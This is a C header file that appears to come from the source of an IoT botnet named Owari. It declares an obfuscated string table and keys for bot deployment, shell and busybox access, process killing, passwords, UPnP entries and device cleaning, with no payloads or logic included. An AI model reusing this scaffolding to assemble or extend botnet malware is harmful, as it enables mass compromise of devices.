#pragma once

#include <stdint.h>
#include "includes.h"

struct table_value
{
    char *val;
    uint16_t val_len;

    #ifdef DEBUG
        BOOL locked;
    #endif
};
#define OWARI_PORT 1
#define OWARI_BOT_DEPLOY 2
#define OWARI_SHELL 3
#define OWARI_ENABLE 4
#define OWARI_SYSTEM 5
#define OWARI_SH 6
#define OWARI_BUSYBOX 7
#define OWARI_NOTFOUND 8
#define OWARI_ERROR1 9
#define OWARI_PS 10
#define OWARI_KILL 11
#define OWARI_PROC 12
#define OWARI_EXE 13
#define OWARI_FOUND 14
#define OWARI_MAPS 15
#define OWARI_TCP 16
#define OWARI_ROUTE 17
#define OWARI_PASSWORD 18
#define OWARI_GABEN 19
#define OWARI_RESOLV 20
#define OWARI_NAMESERVER 21
#define OWARI_CALL 22
#define OWARI_CALL2 23
#define OWARI_PASSWORD2 24
#define OWARI_LOGIN 25
#define OWARI_ENTER 26
#define OWARI_RANDOM 27
#define OWARI_STATUS 28
#define OWARI_MEME 29
#define OWARI_UPNP_1 30
#define OWARI_UPNP_2 31
#define OWARI_UPNP_3 32
#define OWARI_UPNP_4 33
#define OWARI_UPNP_5 34
#define OWARI_UPNP_6 35
#define OWARI_UPNP_7 36
#define OWARI_UPNP_8 37
#define OWARI_UPNP_9 38
#define OWARI_UPNP_10 39
#define OWARI_UPNP_11 40
#define OWARI_CLEAN_DEVICE 41

#define TABLE_MAX_KEYS 42

void table_init(void);
void table_unlock_val(uint8_t);
void table_lock_val(uint8_t); 
char *table_retrieve_val(int, int *);

static void add_entry(uint8_t, char *, int);
static void toggle_obf(uint8_t);
